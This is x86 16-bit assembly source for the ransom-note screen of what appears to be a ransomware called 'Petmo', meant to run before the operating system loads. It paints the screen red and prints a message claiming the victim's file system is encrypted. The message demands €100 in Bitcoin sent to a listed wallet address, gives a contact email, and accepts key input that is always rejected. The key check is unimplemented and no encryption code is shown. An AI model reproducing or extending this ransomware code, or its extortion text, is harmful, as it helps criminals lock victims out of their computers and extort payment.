;;Ransomletter, Decryptor, Key funktio

BITS 16

mov ah, 0x00        
mov al, 0x03        ;format 640x200
int 0x10            

mov ah, 0x0B        ; <= Set screen style
mov bh, 0x00        ; <= Set screen style
mov bl, 0x04        ; <= Set background color: Red
int 0x10            

jmp showFakeBanner  ; <= Jump to 'showFakeBanner'

showFakeBanner:                    
        mov si, firstString        
        call printText             

        mov si, secondString       
        call printText                     

        mov si, descriptionString  
        call printText             

        jmp getUserInput           ;Call function 'getUserInput'

getUserInput:
            mov si, fourghtString  
            call printText         
            mov di, inputString    

getKeyLoop:
            mov ah, 0x00           ; <= Set function 'Reading' for interrupt 16h
            int 0x16               ; <= Use 16h interrupt

            mov ah, 0x0e           ; <= Set char types and colors
            cmp al, 0xD            ; <= [!] IT'S A FUTURE FUNCTION! FOR DECRYPTION PROCESS AND CHECK REAL KEY!
            je getCheckKey         
            int 0x10               ; <= Use 10h interrupt
            mov [di], al           ; <= Move AL to memory of DI address
            inc di                 ; <= DI += 1;
            jmp getKeyLoop         ; <= Loop | jump to function 'getKeyLoop'

getCheckKey:                        ; <= [!] IT'S A FUTURE FUNCTION! FOR DECRYPTION PROCESS AND CHECK REAL KEY!
            mov byte [di], 0        ; <= [!] IT'S A FUTURE FUNCTION! FOR DECRYPTION PROCESS AND CHECK REAL KEY!
            mov al, [inputString]   ; <= [!] IT'S A FUTURE FUNCTION! FOR DECRYPTION PROCESS AND CHECK REAL KEY!
            mov si, invalidKey      ; <= Set text to SI register
            call printText          
            jmp getUserInput        

printText:                     ; <= Function 'printText'
        mov ah, 0x0e           ; <= Set the text print mode
        mov bh, 0x00           ; <= Set screen and text parameters
        mov bl, 0x07           ; <= Set screen and text parameters

printChar:
        mov al, [si]           ; <= Move bytecode from memory address [RAM] of SI to AL register

        cmp al, 0              ; <= If AL = 0...
        je endPrinting         ; <= Call function 'endPrinting'
                               ; <= Else...
        int 0x10               ; <= Use 10h interrupt
        add si, 1              ; <= Move +1 to SI register (inc si)
        jmp printChar          ; <= Jump to 'printChar' function. It's a simple loop

endPrinting:                   ; <= Function 'endPrinting'
        ret                    ; <= Return

firstString: db '  Oops, Your file system got encrypted by Petmo ransomware!',  0xA, 0xD, 0          ; <= Text for show
secondString: db '======================================================================', 0xA, 0xD, 0  ; <= Text for show
descriptionString: db ' If you can read this text, then your computer is no longer usable, because it', 0xA, 0xD,' got encrypted. You can not use your computer again without a specific', 0xA, 0xD,' decryption key. Note that the key costs. To purchase it, follow these steps', 0xA, 0xD, ' ', 0xA, 0xD, '   -Send €100 worth of Bitcoin to address below', 0xA, 0xD, ' ', 0xA, 0xD, '     bc1qxcnwcmvfshqv8jxdusqp97zw8uc9xkrlsw79gv ', 0xA, 0xD, ' ', 0xA, 0xD, '   -Contact petmcus@tutamail.com to get your personal decryption key', 0xA, 0xD, ' ', 0xA, 0xD,'   When you have recieved the key, please enter it below.', 0xA, 0xD, ' ', 0xA, 0xD, ' We promise that you will be able to get your files back.', 0xA, 0xD, ' All you have to do is follow previously mentoned steps.', 0xA, 0xD, ' ', 0xA, 0xD, 0 ; Ransomtext
fourghtString: db ' Key: ', 0                                                               ; <= Text for show
invalidKey: db '  => Error! Invalid key', 0xA, 0xD, 0                                                      ; <= Error text for show
inputString: db ' ', 0                                                                                           ; <= Bug-fix text

times 1024-($-$$) db 0  
